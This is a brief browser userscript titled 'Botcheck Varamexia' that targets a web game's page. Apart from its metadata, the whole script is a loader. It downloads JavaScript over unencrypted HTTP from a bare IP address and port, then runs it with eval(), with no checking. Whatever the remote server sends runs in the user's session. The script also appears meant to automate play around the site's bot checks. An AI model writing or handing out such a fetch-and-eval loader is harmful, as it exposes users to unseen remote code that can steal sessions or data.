// ==UserScript==
// @name        Botcheck Varamexia
// @namespace   Bot
// @include     http://*varamexia.com/game.php*
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// @version     2
// ==/UserScript==
GM_xmlhttpRequest({
  	method: "GET",
  	url: "http://123.30.53.197:1340/source.user.js",
  	onload: function(res){
  		eval(res.responseText);
  	}
});